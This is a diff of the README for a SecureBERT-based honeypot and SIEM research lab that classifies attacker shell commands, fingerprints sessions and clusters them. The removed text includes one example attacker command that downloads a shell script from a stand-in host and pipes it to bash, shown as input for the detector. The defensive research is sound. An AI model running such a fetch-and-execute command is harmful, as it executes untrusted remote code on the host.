@@ -1,189 +1,131 @@
-# SecureBERT Active Defense SIEM
+# SecureBERT Threat Analysis Lab
 
-A real-time cybersecurity honeypot and SIEM dashboard that uses SecureBERT for command classification, BERT semantic fingerprinting for returning attacker identity, and DBSCAN behavioral clustering for session grouping.
+**Research prototype for semantic command classification, session fingerprinting, behavioral clustering, and analyst-facing threat telemetry.**
 
----
+This repository captures an earlier stage of my security/AI engineering work. The newer **SentinelIQ** project extends the same interest into a production-style streaming architecture with Kafka, PostgreSQL, model-aligned explanations, observability, Docker, and stronger ML-integrity tests.
 
-## Project Overview
+## Problem
 
-This system analyzes attacker shell commands using a hybrid pipeline:
-- deterministic MITRE rule patterns for high-confidence command signatures
-- SecureBERT inference for semantic command understanding
-- session embedding fingerprinting for returning attacker detection
-- DBSCAN clustering to group similar attacker sessions
+Security telemetry is noisy, repeated attacker behavior can change surface details, and purely signature-based detection misses semantic similarity. This lab explores a hybrid approach:
 
-The result is a stronger active defense system that can terminate malicious sessions and surface attacker behavior on a live dashboard.
+- deterministic MITRE-oriented rules for high-confidence patterns
+- SecureBERT inference for semantic command classification
+- BERT session embeddings for similarity-based identity matching
+- DBSCAN clustering for behavioral grouping
+- a FastAPI/WebSocket backend and Next.js analyst dashboard
 
----
+The system is intentionally a **lab**, not a claim of production autonomous defense.
 
-## Upgrades Completed
+## Architecture
 
-### SecureBERT Integration
-- Replaced the legacy TF-IDF + Logistic Regression workflow with SecureBERT.
-- Model files are loaded from `siem/model/securebert/`.
-- New classifier module is `siem/model/classifier.py`.
-- Raw commands are preprocessed, decoded from embedded Base64, normalized, and lowercased.
-
-### Hybrid Classification Flow
-- Fast deterministic rules classify obvious malicious commands immediately.
-- If no rule matches, SecureBERT predicts the tactic and confidence.
-- This keeps detection fast for standard attack patterns while still supporting semantic threat detection.
-
-### Active Defense Kill Signal
-- Backend now computes `kill = confidence > 0.85` for selected tactics:
-  - `EXECUTION`
-  - `PRIVILEGE_ESCALATION`
-  - `CREDENTIAL_ACCESS`
-- The honeypot listener receives `action: BLOCK` and terminates the attacking session.
-- This is implemented in `siem/main.py` and enforced by `agent/listener.py`.
-
-### BERT Semantic Fingerprinting
-- Session embeddings are computed from SecureBERT command embeddings.
-- Returning attacker identity is detected by cosine similarity over session vectors.
-- Identities are tracked with fingerprint hashes and matched across sessions.
-
-### DBSCAN Behavioral Clustering
-- Session embeddings are clustered by DBSCAN in `siem/main.py`.
-- Similar attack sessions are grouped into `CLUSTER_000`, `CLUSTER_001`, etc.
-- Outliers are surfaced as unique or one-off attack behavior.
-
-### Dependencies Updated
-- `siem/requirements.txt` now includes:
-  - `torch>=2.0.0`
-  - `transformers==4.40.2`
-  - `tokenizers==0.19.1`
-  - `huggingface-hub==0.23.4`
-  - `safetensors>=0.4.1`
-
-### Verification
-- Added a test runner at `siem/test_engine.py`.
-- Verified SecureBERT loads and predicts correctly before starting the full stack.
-
----
-
-## Core Features
-
-### SecureBERT Command Classification
-Maps commands to MITRE techniques through a deep learning model plus deterministic rules.
-
-### Active Defense (Kill Signal)
-Terminates the session when a critical threat is detected with high confidence.
-
-### Returning Attacker Detection
-Uses BERT semantic fingerprints to detect returning attackers even if they switch IPs or alter command text slightly.
-
-### Behavioral Clustering
-Groups similar sessions with DBSCAN to identify campaigns, repeated tooling, and attacker behavior clusters.
-
-### Live SIEM Dashboard
-Streams alerts and session metadata to a Next.js dashboard in real time.
-
----
-
-## Tech Stack
-
-| Component | Technology |
-|---|---|
-| Machine Learning | Python, PyTorch, Transformers, SecureBERT |
-| Backend / API | FastAPI, WebSockets |
-| Frontend | Next.js 14, Tailwind CSS, Lucide-React |
-| Agent / Probe | Python Socket Programming |
-
----
-
-## How the ML Engine Works
-
-The classification pipeline now includes:
-1. rule-based MITRE pattern matching for quick, deterministic detection
-2. preprocessing that strips wrappers and decodes embedded Base64
-3. SecureBERT tokenization and model inference for semantic threat classification
-4. session embedding extraction for fingerprinting and clustering
-
-### Example
-
-Even if an attacker sends:
-
-```bash
-/bin/sh -c "curl http://evil.com/shell.sh | bash"
+```text
+Honeypot / command telemetry
+            |
+            v
+       FastAPI backend
+       /      |      \
+      v       v       v
+ rules    SecureBERT  session embeddings
+      \       |       /
+       \      v      /
+        threat classification
+               |
+      +--------+---------+
+      |                  |
+      v                  v
+MITRE explanation   similarity + DBSCAN
+      |                  |
+      +--------+---------+
+               v
+        WebSocket stream
+               |
+               v
+        Next.js dashboard
 ```
 
-The system will normalize it and either match it via rules or classify it through the BERT model.
+## Engineering evidence
 
----
+### Hybrid classification
+Obvious patterns can be handled deterministically before invoking the model. Unmatched commands are normalized and passed to SecureBERT for semantic classification.
 
-## Getting Started
+### Session fingerprinting
+Session-level BERT embeddings are compared with prior sessions using cosine similarity. The goal is to explore whether behavior can remain recognizable even when an IP address or exact command text changes.
 
-### 1. Setup the SIEM Backend
+### Behavioral clustering
+DBSCAN groups session embeddings without requiring a predefined number of clusters and surfaces noise points as unusual behavior.
+
+### Analyst-facing application
+FastAPI exposes telemetry, sessions, fingerprints, clusters, and report generation. A Next.js dashboard consumes the live stream for investigation.
+
+## Safety boundary
+
+The prototype can return a `BLOCK` recommendation when configured thresholds are met, but this repository should **not** be deployed as an autonomous production enforcement system. Real production use would require calibrated external evaluation, policy controls, human review where appropriate, hardened identity/access controls, durable storage, rate limiting, and operational rollback procedures.
+
+## Stack
+
+| Layer | Technology |
+| --- | --- |
+| ML | Python, PyTorch, Transformers, SecureBERT, scikit-learn, DBSCAN |
+| API | FastAPI, WebSockets |
+| Frontend | Next.js 14, TypeScript/Tailwind |
+| Probe | Python socket programming |
+| Threat context | MITRE ATT&CK data |
+
+## Run locally
+
+### Backend
 
 ```bash
-cd /Users/hassanali/Desktop/ProjIdea
+python -m venv .venv
 source .venv/bin/activate
 pip install -r siem/requirements.txt
-cd siem
-python3 test_engine.py
+uvicorn siem.main:app --reload --host 0.0.0.0 --port 8000
 ```
 
-### 2. Start the SIEM Backend
+SecureBERT artifacts are expected under `siem/model/securebert/` and are intentionally not committed when they are too large for normal source control.
+
+### Probe
 
 ```bash
-cd /Users/hassanali/Desktop/ProjIdea
-source .venv/bin/activate
-.venv/bin/python3 -m uvicorn siem.main:app --reload --host 0.0.0.0 --port 8000
+python agent/listener.py
 ```
 
-### 3. Start the Honeypot Agent
+### Dashboard
 
 ```bash
-cd /Users/hassanali/Desktop/ProjIdea/agent
-python3 listener.py
-```
-
-### 4. Start the Dashboard
-
-```bash
-cd /Users/hassanali/Desktop/ProjIdea/dashboard
-npm install
+cd dashboard
+npm ci
 npm run dev
 ```
 
----
-
-## File Structure
+## Repository structure
 
 ```text
-project-root/
-├── agent/
-│   └── listener.py
-├── dashboard/
-│   ├── app/
-│   └── page.tsx
-├── siem/
-│   ├── main.py
-│   ├── engine.py
-│   ├── test_engine.py
-│   └── model/
-│       ├── classifier.py
-│       └── securebert/
-└── README.md
+agent/                  # telemetry/honeypot probe
+siem/                   # API, classification, session analysis
+siem/model/             # model integration
+dashboard/              # analyst UI
+mitre_attack.json       # MITRE dataset used by the lab
+.github/workflows/ci.yml
 ```
 
----
+## Verification
 
-## Example Detection Flow
+The repository includes a lightweight model test harness at `siem/test_engine.py`. CI performs source compilation and a production frontend build without pretending that unavailable model weights can be validated in a clean runner.
 
-1. Attacker connects to the honeypot socket.
-2. `agent/listener.py` captures the command.
-3. Backend receives telemetry at `/telemetry`.
-4. `siem/model/classifier.py` preprocesses and classifies the command.
-5. If the threat is high-confidence, the backend returns `action: BLOCK`.
-6. The agent terminates the session and logs the kill.
-7. Session embeddings are stored and clustered.
-8. The dashboard displays live alerts, returning attackers, and cluster groups.
+## Limitations and next steps
 
----
+- model evaluation here is research-oriented rather than a production benchmark
+- the in-memory session/identity stores are not durable
+- thresholds require external calibration
+- the MITRE data snapshot is intentionally bundled for reproducibility but increases repository size
+- model artifacts must be supplied separately
+- production identity, authorization, observability, persistence, deployment, and regression gates are demonstrated more completely in **SentinelIQ**
 
-## Disclaimer
+## Portfolio progression
 
-This project is for educational and research purposes only. It demonstrates ML-powered detection and active defense concepts.
+This repository is useful as evidence of the evolution of an idea. It demonstrates semantic security analysis and full-stack experimentation; **SentinelIQ** demonstrates the later engineering step toward streaming ingestion, durable storage, observability, containerization, and serving-path integrity.
 
-Do **not** deploy this agent on production systems without additional security hardening.
+## License
+
+MIT.
